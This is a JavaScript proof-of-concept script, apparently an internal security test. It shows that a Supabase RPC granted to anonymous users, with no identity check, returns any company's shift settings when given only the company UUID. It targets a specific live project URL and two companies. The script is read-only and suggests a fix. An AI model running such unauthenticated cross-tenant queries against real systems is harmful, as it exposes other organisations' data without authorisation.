// PoC-1: shift_types RPC 可被 anon 存取（證明 P1 bug）
//
// Bug source: migrations/068_shift_types_rpc.sql:10-26
//   CREATE FUNCTION get_company_shift_types(p_company_id UUID)
//   LANGUAGE plpgsql STABLE SECURITY DEFINER
//   ... WHERE company_id = p_company_id OR company_id IS NULL
//   GRANT EXECUTE ON FUNCTION ... TO anon, authenticated;
//
// 漏洞：RPC 用 SECURITY DEFINER + GRANT anon，但內部無 auth.uid() 身份驗證
//       → 任何 anon 用戶（含未登入）可讀任一公司的班別設定
//
// 此腳本驗證：不登入的情況下，能拿到本米公司的 shift_types
//
// L1 安全：只 SELECT，不寫入 DB
//
// 執行方式：
//   SUPABASE_ANON_KEY=<從 .env 或前端 HTML 取得> node tests/poc/poc1_shift_types_anon.mjs
//
//   ANON key 在 attendance_public.html L337 可見（公開 key，但不直接 commit 進腳本避免 gitleaks 告警）
//
// 預期結果：
//   - status 200
//   - 回傳 JSON 陣列（若本米有班別設定則非空）
//   - 證明：無登入 + 知道公司 UUID 即可讀班別 → P1 成立

import { createClient } from '@supabase/supabase-js';

const SUPABASE_URL = 'https://nssuisyvlrqnqfxupklb.supabase.co';
const SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY;

if (!SUPABASE_ANON_KEY) {
    console.error('❌ 請設定環境變數 SUPABASE_ANON_KEY 再跑（參考 attendance_public.html L337 的 anon key）');
    process.exit(1);
}

// 本米公司 UUID（來自 CLAUDE.md）— 測試跨公司讀取
const BENMI_COMPANY_ID = 'fb1f6b5f-dcd5-4262-a7de-e7c357662639';
const DAZHENG_COMPANY_ID = '8a669e2c-7521-43e9-9300-5c004c57e9db';

async function main() {
    console.log('=== PoC-1: shift_types anon 存取測試 ===\n');

    // 建立 anon client（模擬未登入攻擊者）
    const sb = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    console.log(`Supabase URL: ${SUPABASE_URL}`);
    console.log(`Auth: anon key（未 sign in）\n`);

    // 測試 1：讀本米的 shift_types
    console.log('[Test 1] get_company_shift_types(本米)...');
    const { data: benmi, error: e1 } = await sb.rpc('get_company_shift_types', {
        p_company_id: BENMI_COMPANY_ID
    });
    if (e1) {
        console.log(`  ❌ Error: ${e1.message}`);
    } else {
        console.log(`  ✅ 回傳: ${JSON.stringify(benmi).slice(0, 200)}`);
        console.log(`  記錄數: ${Array.isArray(benmi) ? benmi.length : 'N/A'}`);
    }

    // 測試 2：讀大正科技的 shift_types
    console.log('\n[Test 2] get_company_shift_types(大正科技)...');
    const { data: dazheng, error: e2 } = await sb.rpc('get_company_shift_types', {
        p_company_id: DAZHENG_COMPANY_ID
    });
    if (e2) {
        console.log(`  ❌ Error: ${e2.message}`);
    } else {
        console.log(`  ✅ 回傳: ${JSON.stringify(dazheng).slice(0, 200)}`);
        console.log(`  記錄數: ${Array.isArray(dazheng) ? dazheng.length : 'N/A'}`);
    }

    // 判斷
    console.log('\n=== 結論 ===');
    if (!e1 && !e2) {
        console.log('🔴 P1 確認：未登入狀態下，任一公司 UUID 皆可讀取 shift_types');
        console.log('   → RPC 缺 auth.uid() 身份驗證');
        console.log('   → 修復方向：RPC 內部加 "IF NOT is_caller_admin_of(p_company_id) THEN RAISE ..."');
    } else {
        console.log('⚠️ 預期外結果，請檢查 error 細節');
    }
}

main().catch(e => {
    console.error('Fatal error:', e);
    process.exit(1);
});
